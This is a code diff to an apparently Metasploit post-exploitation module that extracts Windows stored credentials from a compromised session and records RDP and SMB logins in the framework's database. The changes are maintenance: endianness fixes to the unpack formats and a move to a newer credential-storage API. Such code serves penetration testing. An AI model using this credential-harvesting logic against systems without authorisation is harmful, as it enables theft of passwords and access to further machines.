@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -37,7 +37,7 @@ class Metasploit3 < Msf::Post
     if is_86
       addr = [data].pack("V")
     else
-      addr = [data].pack("Q")
+      addr = [data].pack("Q<")
     end
     return addr
   end
@@ -95,7 +95,7 @@ class Metasploit3 < Msf::Post
       len,add = ret["pDataOut"].unpack("V2")
     else
       ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,16)
-      len,add = ret["pDataOut"].unpack("Q2")
+      len,add = ret["pDataOut"].unpack("Q<2")
     end
 
     #get data, and return it
@@ -122,9 +122,11 @@ class Metasploit3 < Msf::Post
       if cred["targetname"].include? "TERMSRV"
         host = cred["targetname"].gsub("TERMSRV/","")
         port = 3389
+        service = "rdp"
       elsif cred["type"] == 2
         host = cred["targetname"]
         port = 445
+        service = "smb"
       else
         return false
       end
@@ -132,23 +134,32 @@ class Metasploit3 < Msf::Post
       ip_add= gethost(host)
 
       unless ip_add.nil?
-        if session.db_record
-          source_id = session.db_record.id
-        else
-          source_id = nil
-        end
-        auth = {
-          :host => ip_add,
-          :port => port,
-          :user => cred["username"],
-          :pass => cred["password"],
-          :type => 'password',
-          :source_id => source_id,
-          :source_type => "exploit",
-          :active => true
+        service_data = {
+          address: ip_add,
+          port: port,
+          protocol: "tcp",
+          service_name: service,
+          workspace_id: myworkspace_id
         }
 
-        report_auth_info(auth)
+        credential_data = {
+          origin_type: :session,
+          session_id: session_db_id,
+          post_reference_name: self.refname,
+          username: cred["username"],
+          private_data: cred["password"],
+          private_type: :password
+        }
+
+        credential_core = create_credential(credential_data.merge(service_data))
+
+        login_data = {
+          core: credential_core,
+          access_level: "User",
+          status: Metasploit::Model::Login::Status::UNTRIED
+        }
+
+        create_credential_login(login_data.merge(service_data))
         print_status("Credentials for #{ip_add} added to db")
       else
         return
@@ -177,14 +188,14 @@ class Metasploit3 < Msf::Post
       #read array of addresses as pointers to each structure
       raw = read_str(p_to_arr[0], arr_len, 2)
       pcred_array = raw.unpack("V*") if is_86
-      pcred_array = raw.unpack("Q*") unless is_86
+      pcred_array = raw.unpack("Q<*") unless is_86
 
       #loop through the addresses and read each credential structure
       pcred_array.each do |pcred|
         cred = {}
         raw = read_str(pcred, 52,2)
-        cred_struct = raw.unpack("VVVVQVVVVVVV") if is_86
-        cred_struct = raw.unpack("VVQQQQQVVQQQ") unless is_86
+        cred_struct = raw.unpack("VVVVQ<VVVVVVV") if is_86
+        cred_struct = raw.unpack("VVQ<Q<Q<Q<Q<VVQ<Q<Q<") unless is_86
         cred["flags"] = cred_struct[0]
         cred["type"] = cred_struct[1]
         cred["targetname"] = read_str(cred_struct[2],512, 1)
